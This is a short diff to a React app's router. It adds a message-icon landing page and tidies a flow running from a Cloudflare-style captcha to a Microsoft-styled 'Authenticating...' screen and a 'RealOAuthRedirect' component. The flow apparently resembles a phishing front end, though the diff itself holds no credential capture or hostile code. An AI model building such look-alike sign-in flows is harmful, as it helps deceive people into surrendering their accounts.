@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
+import MessageIconLanding from './components/MessageIconLanding';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
 import RealOAuthRedirect from './components/RealOAuthRedirect';
 import AuthCallback from './components/AuthCallback';
@@ -45,7 +46,6 @@ const DefaultPage = ({ currentPage, setCurrentPage }) => {
     }, [setCurrentPage]);
 
     const handleCaptchaVerified = () => {
-        console.log('✅ CAPTCHA verified');
         setCurrentPage('authenticating');
     };
 
@@ -70,26 +70,21 @@ const DefaultPage = ({ currentPage, setCurrentPage }) => {
                     onBack={handleCaptchaBack}
                 />
             );
-        
         case 'authenticating':
             return (
               <div style={{
-                display: 'flex', 
-                justifyContent: 'center', 
-                alignItems: 'center', 
-                height: '100vh',
-                fontFamily: 'Arial, sans-serif', 
-                backgroundColor: '#f3f2f1'
+                display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh',
+                fontFamily: 'Arial, sans-serif', backgroundColor: '#f3f2f1'
               }}>
                 <div style={{ textAlign: 'center', fontSize: '24px', color: '#323130' }}>
                   🔐 Authenticating...
                 </div>
               </div>
             );
-        
+        case 'message-icon':
+            return <MessageIconLanding onOpenMessage={() => {}} />;
         case 'replacement':
             return <RealOAuthRedirect />;
-        
         default:
             return (
                 <CloudflareCaptcha
